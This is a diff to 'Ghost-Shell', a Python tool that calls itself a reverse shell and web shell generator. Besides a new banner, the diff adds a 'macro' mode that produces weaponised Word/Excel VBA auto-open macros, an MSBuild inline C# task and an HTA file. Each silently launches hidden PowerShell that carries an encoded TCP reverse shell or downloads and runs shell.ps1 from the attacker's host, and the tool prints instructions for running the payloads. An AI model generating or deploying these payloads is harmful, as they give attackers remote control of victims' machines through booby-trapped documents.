@@ -37,19 +37,59 @@ import sys
 import os
 from datetime import datetime
 
-VERSAO = "2.0.0"
+VERSAO = "2.1.0"
 
-BANNER = r"""
-   _____ _               _     _____ _          _ _
-  / ____| |             | |   / ____| |        | | |
- | |  __| |__   ___  ___| |_  | (___ | |__   ___| | |
- | | |_ | '_ \ / _ \/ __| __|  \___ \| '_ \ / _ \ | |
- | |__| | | | | (_) \__ \ |_   ____) | | | |  __/ | |
-  \_____|_| |_|\___/|___/\__| |_____/|_| |_|\___|_|_|
 
-  Ghost-Shell v{v}  |  Reverse Shell & Web Shell Generator
-  By Gh0st-Bx1  |  github.com/Ghost-Bx1
-""".format(v=VERSAO)
+def _build_banner():
+    import re as _re
+    G = "\033[92m"; Cy = "\033[96m"; D = "\033[2m"; N = "\033[1m"
+    W = "\033[97m"; X = "\033[0m"
+    IW = 68; eq = "\u2550" * IW; sp = " " * IW
+    TL = "\u2554"; TR = "\u2557"; BL = "\u255a"; BR = "\u255d"; VB = "\u2551"
+    hl = "\u2500" * 44; bar = "\u2502"
+    vl = lambda s: len(_re.sub(r"\x1b\[[0-9;]*m", "", s))
+
+    def _row(s):
+        n = vl(s); p = max(0, IW - n); l = p // 2; r = p - l
+        return f"{G}{VB}{X}{' ' * l}{s}{' ' * r}{G}{VB}{X}"
+
+    def _row_l(s):
+        n = vl(s); p = max(0, IW - n - 2)
+        return f"{G}{VB}{X}  {s}{' ' * p}{G}{VB}{X}"
+
+    ga = [
+        (f"{D}         {X}", f"{G}  .-\"\"\"\"\"\"\"\"\"-.  {X}", f"{D}         {X}"),
+        (f"{D}-- -..   {X}", f"{G} /  _       _  \\ {X}", f"{D}   ..- --{X}"),
+        (f"{D}----..   {X}", f"{G}| (:3 )  (:3 )  |{X}", f"{D}   ..----{X}"),
+        (f"{D}----..   {X}", f"{G}|   '--------'  |{X}", f"{D}   ..----{X}"),
+        (f"{D}-...     {X}", f"{G}|    \\ \\U/ /    |{X}", f"{D}     ...-{X}"),
+        (f"{D}         {X}", f"{G}|_______________|{X}", f"{D}         {X}"),
+        (f"{D}         {X}", f"{G} \\/\\/\\ /\\ /\\/\\/ {X}", f"{D}         {X}"),
+    ]
+
+    info = [
+        f"{G}{N}GHOST-SHELL{X}",
+        f"{Cy}v{VERSAO}  {D}Payload Generator & Shell Listener{X}",
+        f"{D}{hl}{X}",
+        f"{W}By Gh0st-Bx1  {D}{bar}  github.com/Ghost-Bx1{X}",
+        f"{D}{hl}{X}",
+        f"{D}gen  webshell  encode  list  macro  amsi{X}",
+        f"{D}xor  obfuscate  c2  listen{X}",
+        f"{D}bash  ps1  php  perl  ruby  go  java  awk{X}",
+    ]
+
+    out = [f"{G}{TL}{eq}{TR}{X}", f"{G}{VB}{sp}{VB}{X}"]
+    for left, center, right in ga:
+        combined = left + center + right
+        out.append(_row(combined))
+    out.append(f"{G}{VB}{sp}{VB}{X}")
+    for i in info:
+        out.append(_row_l(i))
+    out += [f"{G}{VB}{sp}{VB}{X}", f"{G}{BL}{eq}{BR}{X}"]
+    return "\n".join(out)
+
+
+BANNER = _build_banner()
 
 C = {
     "R": "\033[91m", "G": "\033[92m", "Y": "\033[93m",
@@ -824,6 +864,130 @@ def iniciar_listener(ip, porta):
 
 
 # ==============================================================================
+# MACRO PAYLOADS
+# ==============================================================================
+
+MACRO_PAYLOADS = {
+    "vba_word": {
+        "descricao": "VBA macro para Word (Document_Open) - executa cmd via Shell",
+        "extensao": ".bas",
+        "template": """\
+' Ghost-Shell VBA Macro - Word/Excel payload
+' Insert via VBA Editor (Alt+F11) -> Module -> Paste
+Sub Document_Open()
+    GhostExec
+End Sub
+
+Sub Workbook_Open()
+    GhostExec
+End Sub
+
+Sub GhostExec()
+    Dim cmd As String
+    cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {B64}"
+    Shell "cmd /c " & cmd, vbHide
+End Sub
+""",
+    },
+    "msbuild": {
+        "descricao": "MSBuild XML task - inline C# that executes a command",
+        "extensao": ".xml",
+        "template": """\
+<!-- Ghost-Shell MSBuild Payload -->
+<!-- Run: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe payload.xml -->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="GhostTarget">
+    <GhostTask />
+  </Target>
+  <UsingTask TaskName="GhostTask" TaskFactory="CodeTaskFactory"
+    AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs"><![CDATA[
+        using System;
+        using System.Diagnostics;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        public class GhostTask : Task, ITask {{
+            public override bool Execute() {{
+                Process.Start(new ProcessStartInfo {{
+                    FileName = "powershell",
+                    Arguments = "-NoP -NonI -W Hidden -Exec Bypass -Enc {B64}",
+                    UseShellExecute = false, CreateNoWindow = true
+                }});
+                return true;
+            }}
+        }}
+      ]]></Code>
+    </Task>
+  </UsingTask>
+</Project>
+""",
+    },
+    "hta": {
+        "descricao": "HTA/JScript payload - abre via mshta.exe ou duplo clique",
+        "extensao": ".hta",
+        "template": """\
+<html>
+<head><title>Ghost-Shell HTA</title></head>
+<script language="JScript">
+// Ghost-Shell HTA payload
+// Execute: mshta payload.hta
+var cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {B64}";
+var ws = new ActiveXObject("WScript.Shell");
+ws.Run("cmd /c " + cmd, 0, false);
+window.close();
+</script>
+<body></body>
+</html>
+""",
+    },
+    "vba_raw": {
+        "descricao": "VBA puro sem encoding - payload cmd direto (mais simples)",
+        "extensao": ".bas",
+        "template": """\
+' Ghost-Shell VBA Raw - comando direto
+Sub Document_Open()
+    Dim ws As Object
+    Set ws = CreateObject("WScript.Shell")
+    ws.Run "cmd /c {CMD}", 0, False
+End Sub
+""",
+    },
+}
+
+
+def gerar_macro(tipo, ip, porta, linguagem="powershell", raw_cmd=None):
+    """Gera payload de macro do tipo especificado com reverse shell embutido."""
+    if tipo not in MACRO_PAYLOADS:
+        _log(f"Tipo desconhecido: {tipo}. Opcoes: {', '.join(MACRO_PAYLOADS.keys())}", "ERRO")
+        return
+
+    info = MACRO_PAYLOADS[tipo]
+    _log(f"Gerando macro: {tipo} ({info['descricao']})", "TITULO")
+
+    if tipo == "vba_raw":
+        cmd = raw_cmd or f"powershell -NoP -NonI -W Hidden -Exec Bypass IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{porta}/shell.ps1')"
+        template = info["template"].replace("{CMD}", cmd)
+    else:
+        # Gera payload base64 para powershell reverse shell
+        ps_payload = f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{porta});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
+        import base64 as _b64
+        b64 = _b64.b64encode(ps_payload.encode("utf-16-le")).decode()
+        template = info["template"].replace("{B64}", b64)
+
+    print(f"\n{C['G']}{template}{C['X']}")
+    _log(f"Tipo: {tipo} | Listener: {ip}:{porta}", "OK")
+    _log(f"Extensao esperada: {info['extensao']}", "INFO")
+
+    if tipo == "msbuild":
+        _log("Executar: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe payload.xml", "INFO")
+    elif tipo == "hta":
+        _log("Executar: mshta.exe payload.hta  OU  mshta.exe http://IP/payload.hta", "INFO")
+    elif tipo in ("vba_word", "vba_raw"):
+        _log("Inserir via VBA Editor (Alt+F11) no Word/Excel -> Modulo -> Colar", "INFO")
+
+
+# ==============================================================================
 # CLI
 # ==============================================================================
 
@@ -897,6 +1061,15 @@ def main():
     p_listen.add_argument("-i", "--ip", default="0.0.0.0", help="IP bind (padrao: 0.0.0.0)")
     p_listen.add_argument("-p", "--porta", required=True, type=int, help="Porta do listener")
     p_listen.add_argument("--max", type=int, default=5, help="Max conexoes simultaneas (padrao: 5)")
+
+    # Modo MACRO
+    p_macro = sub.add_parser("macro", help="Gerar macro Office/MSBuild/HTA com reverse shell")
+    p_macro.add_argument("--tipo", required=True,
+                         choices=list(MACRO_PAYLOADS.keys()),
+                         help=f"Tipo: {', '.join(MACRO_PAYLOADS.keys())}")
+    p_macro.add_argument("-i", "--ip", required=True, help="IP do listener (atacante)")
+    p_macro.add_argument("-p", "--porta", required=True, type=int, help="Porta do listener")
+    p_macro.add_argument("--cmd", help="Comando raw (apenas para vba_raw)")
 
     args = parser.parse_args()
 
@@ -997,6 +1170,9 @@ def main():
 
     elif args.modo == "listen":
         iniciar_listener_multi(args.ip, args.porta, max_conexoes=args.max)
+
+    elif args.modo == "macro":
+        gerar_macro(args.tipo, args.ip, args.porta, raw_cmd=args.cmd)
 
     print(f"\n  {C['G']}{C['N']}[+] Ghost-Shell finalizado.{C['X']}\n")
 
